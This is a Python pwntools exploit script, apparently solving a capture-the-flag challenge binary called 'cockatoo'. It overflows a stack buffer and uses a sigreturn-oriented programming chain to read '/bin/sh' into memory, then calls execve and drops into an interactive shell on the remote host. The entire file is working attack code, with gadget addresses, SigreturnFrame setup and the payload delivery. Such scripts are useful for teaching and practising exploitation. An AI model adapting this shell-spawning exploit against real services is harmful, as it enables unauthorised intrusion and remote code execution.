#!/usr/bin/env python3
from pwn import *
from time import sleep

elf = exe = context.binary = ELF(args.EXE or 'cockatoo')

host = args.HOST or 'test'
port = int(args.PORT or 31408)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=True, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+80
b *main+209
continue
'''.format(**locals())

context.terminal = "tmux splitw -h".split()

io = start()

offset = 32 * 8

pay  = b"A" * offset
pay += p64(16)

pop_rax = 0x0000000000401001 # : pop rax ; ret
syscall = 0x0000000000401a8b # : syscall;ret

rop  = p64(pop_rax)
rop += p64(0xf)
rop += p64(syscall)

# read
read_sys = SigreturnFrame()
read_sys.rdi = 0
read_sys.rax = 0
read_sys.rsi = 0x403000
read_sys.rdx = 0x500
read_sys.rsp = 0x403008
read_sys.rip = syscall

pay += rop
pay += bytes(read_sys)

print(len(pay))

io.send(pay)

# for i in pay:
#     io.send(chr(i))

io.sendline()

# raw_input("GDB")
sleep(2)

# Execve
execve_frame = SigreturnFrame()
execve_frame.rdi = 0x403000
execve_frame.rdx = 0
execve_frame.rsi = 0
execve_frame.rax = 0x3b
execve_frame.rip = syscall

chain  = rop
chain += bytes(execve_frame)

io.send(b"/bin/sh\x00" + chain)

io.interactive()
